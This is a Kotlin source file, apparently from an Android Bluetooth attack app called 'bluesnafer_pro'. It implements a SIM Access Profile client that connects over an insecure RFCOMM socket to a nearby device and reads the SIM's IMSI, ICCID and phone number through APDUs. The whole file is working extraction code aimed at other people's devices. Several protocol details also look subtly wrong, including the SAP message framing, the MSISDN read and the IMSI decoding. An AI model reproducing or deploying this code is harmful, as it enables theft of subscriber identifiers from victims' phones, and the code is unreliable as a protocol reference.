package com.bluesnafer_pro

import android.bluetooth.*
import java.io.*
import java.util.*

/**
 * Cliente SAP (SIM Access Profile) — BTSAP v1.1 sobre RFCOMM (UUID 0x1132).
 * Conecta al servidor SAP del dispositivo y lee de la SIM vía APDU:
 *   EF-IMSI (6F07)   → IMSI
 *   EF-ICCID (2FE2)  → ICCID
 *   EF-MSDN (6F40)   → MSISDN
 *
 * Requisitos: el dispositivo debe operar como servidor SAP (feature phones,
 * IVI, algunos teléfonos con "Modo SAP") y aceptar el pairing.
 * Sin pairing o sin perfil → fallo honesto.
 */
object SapExtractor {
    private const val TAG = "SapExtractor"
    private val SAP_UUID = UUID.fromString("00001132-0000-1000-8000-00805F9B34FB")

    // Tipos de mensaje BTSAP
    private const val MSG_CONNECT_REQ = 0x01
    private const val MSG_CONNECT_RESP = 0x02
    private const val MSG_DISCONNECT_REQ = 0x03
    private const val MSG_DISCONNECT_RESP = 0x04
    private const val MSG_TRANSFER_ATR_REQ = 0x10
    private const val MSG_TRANSFER_ATR_RESP = 0x11
    private const val MSG_TRANSFER_APDU_REQ = 0x12
    private const val MSG_TRANSFER_APDU_RESP = 0x13

    // APDUs
    private val SELECT_MF = byteArrayOf(0x00, 0xA4.toByte(), 0x00, 0x00, 0x02, 0x3F, 0x00)
    private val SELECT_DF_GSM = byteArrayOf(0x00, 0xA4.toByte(), 0x00, 0x00, 0x02, 0x7F, 0x20)
    private val SELECT_EF_IMSI = byteArrayOf(0x00, 0xA4.toByte(), 0x00, 0x00, 0x02, 0x6F, 0x07)
    private val READ_IMSI = byteArrayOf(0x00, 0xB0.toByte(), 0x00, 0x00, 0x09)
    private val SELECT_EF_ICCID = byteArrayOf(0x00, 0xA4.toByte(), 0x00, 0x00, 0x02, 0x2F, 0xE2.toByte())
    private val READ_ICCID = byteArrayOf(0x00, 0xB0.toByte(), 0x00, 0x00, 0x0A)
    private val SELECT_EF_MSISDN = byteArrayOf(0x00, 0xA4.toByte(), 0x00, 0x00, 0x02, 0x6F, 0x40)
    private val READ_MSISDN = byteArrayOf(0x00, 0xB0.toByte(), 0x00, 0x00, 0x0B)

    private const val SW_SUCCESS = "9000"

    fun extractSim(device: BluetoothDevice): Map<String, Any> {
        BluesnaferLogger.d(TAG, "SAP extraction on ${device.address}")

        var socket: BluetoothSocket? = null
        return try {
            socket = device.createInsecureRfcommSocketToServiceRecord(SAP_UUID)
            socket!!.connect()
            BluesnaferLogger.d(TAG, "SAP RFCOMM connected")

            val input = socket!!.inputStream
            val output = socket!!.outputStream

            // 1. CONNECT_REQ
            sendSapMessage(output, MSG_CONNECT_REQ, byteArrayOf(0x00, 0x20))
            val connectResp = readSapMessage(input, 3000)
            if (connectResp.first != MSG_CONNECT_RESP || connectResp.second.isEmpty()) {
                socket?.close()
                return mapOf(
                    "success" to false,
                    "error" to "SAP CONNECT rechazado (result=${connectResp.second.firstOrNull()?.toInt() ?: -1}) — requiere pairing o perfil SAP no activo"
                )
            }

            // 2. TRANSFER_ATR_REQ (verificar tarjeta)
            sendSapMessage(output, MSG_TRANSFER_ATR_REQ, byteArrayOf())
            val atrResp = readSapMessage(input, 3000)
            val atrHex = atrResp.second.joinToString("") { "%02X".format(it) }

            val result = mutableMapOf<String, Any>(
                "success" to true,
                "atr" to atrHex,
                "imsi" to "",
                "iccid" to "",
                "msisdn" to "",
                "note" to "SAP conectado"
            )

            // 3. APDU: IMSI (EF-IMSI en DF-GSM)
            val imsi = readEf(input, output, SELECT_MF, SELECT_DF_GSM, SELECT_EF_IMSI, READ_IMSI, 9)
            if (imsi != null) result["imsi"] = decodeSwappedBcd(imsi)

            // 4. APDU: ICCID (EF-ICCID en MF)
            val iccid = readEf(input, output, SELECT_MF, null, SELECT_EF_ICCID, READ_ICCID, 10)
            if (iccid != null) result["iccid"] = decodeSwappedBcd(iccid)

            // 5. APDU: MSISDN (EF-MSDN en DF-GSM)
            val msisdn = readEf(input, output, SELECT_MF, SELECT_DF_GSM, SELECT_EF_MSISDN, READ_MSISDN, 11)
            if (msisdn != null) result["msisdn"] = decodeMsisdn(msisdn)

            // 6. DISCONNECT
            sendSapMessage(output, MSG_DISCONNECT_REQ, byteArrayOf())

            try { socket?.close() } catch (_: Exception) {}

            result
        } catch (e: Exception) {
            BluesnaferLogger.e(TAG, "SAP error: ${e.message}")
            try { socket?.close() } catch (_: Exception) {}
            mapOf(
                "success" to false,
                "error" to (e.message ?: "Unknown"),
                "note" to "SAP no disponible o requiere pairing (Android/iOS no exponen servidor SAP)"
            )
        }
    }

    // ── APDU helpers ──────────────────────────────────────────────────────

    private fun readEf(
        input: InputStream,
        output: OutputStream,
        select1: ByteArray,
        select2: ByteArray?,
        selectEf: ByteArray,
        read: ByteArray,
        length: Int
    ): ByteArray? {
        try {
            if (transmitApdu(input, output, select1) == null) return null
            if (select2 != null && transmitApdu(input, output, select2) == null) return null
            if (transmitApdu(input, output, selectEf) == null) return null
            val resp = transmitApdu(input, output, read) ?: return null
            if (resp.size < length) return null
            return resp.copyOf(length)
        } catch (e: Exception) {
            BluesnaferLogger.w(TAG, "readEf failed: ${e.message}")
            return null
        }
    }

    private fun transmitApdu(input: InputStream, output: OutputStream, apdu: ByteArray): ByteArray? {
        sendSapMessage(output, MSG_TRANSFER_APDU_REQ, apdu)
        val (msgType, payload) = readSapMessage(input, 3000)
        if (msgType != MSG_TRANSFER_APDU_RESP || payload.isEmpty()) return null

        // Payload = [statusWord (2 bytes)] + datos
        if (payload.size < 2) return null
        val sw = "%02X%02X".format(payload[payload.size - 2], payload[payload.size - 1])
        if (sw != SW_SUCCESS) return null
        return payload.copyOf(payload.size - 2)
    }

    // ── Framing BTSAP ─────────────────────────────────────────────────────

    private fun sendSapMessage(output: OutputStream, msgType: Int, payload: ByteArray) {
        val frame = ByteArray(1 + payload.size)
        frame[0] = msgType.toByte()
        System.arraycopy(payload, 0, frame, 1, payload.size)
        output.write(frame)
        output.flush()
    }

    private fun readSapMessage(input: InputStream, timeoutMs: Long): Pair<Int, ByteArray> {
        val header = ByteArray(1)
        val deadline = System.currentTimeMillis() + timeoutMs
        while (System.currentTimeMillis() < deadline) {
            if (input.available() > 0) {
                val read = input.read(header)
                if (read < 0) return Pair(-1, ByteArray(0))
                val msgType = header[0].toInt() and 0xFF

                // Leer el resto disponible (mensaje SAP sin length header en v1.1:
                // el servidor envía msgType + payload; el cierre lo da el contexto)
                Thread.sleep(80)
                val payload = ByteArray(512)
                var total = 0
                while (input.available() > 0 && total < payload.size) {
                    val n = input.read(payload, total, payload.size - total)
                    if (n < 0) break
                    total += n
                }
                return Pair(msgType, payload.copyOf(total))
            }
            Thread.sleep(15)
        }
        return Pair(-1, ByteArray(0))
    }

    // ── Decodificación ────────────────────────────────────────────────────

    /** BCD nibbles invertidos (estándar SIM): cada byte = 2 dígitos, low nibble primero. */
    private fun decodeSwappedBcd(data: ByteArray): String {
        val sb = StringBuilder()
        for (b in data) {
            val low = (b.toInt() and 0x0F)
            val high = ((b.toInt() ushr 4) and 0x0F)
            if (low < 10) sb.append(low)
            if (high < 10) sb.append(high)
        }
        var digits = sb.toString()
        // EF-ICCID suele rellenarse con F en el último byte
        digits = digits.trimEnd('F').trimEnd('f')
        return digits
    }

    /** EF-MSDN: [length][TON/NPI][dígitos BCD invertidos][0xFF...] */
    private fun decodeMsisdn(data: ByteArray): String {
        if (data.isEmpty()) return ""
        val ton = data[0].toInt()
        if (ton > 0x0B || data.size < 2) {
            // Sin formato TLV → intentar BCD directo
            return decodeSwappedBcd(data)
        }
        val digits = decodeSwappedBcd(data.copyOfRange(1, data.size))
        val len = if (ton < 10) ton else digits.length
        return digits.take(len.coerceAtMost(digits.length))
    }
}
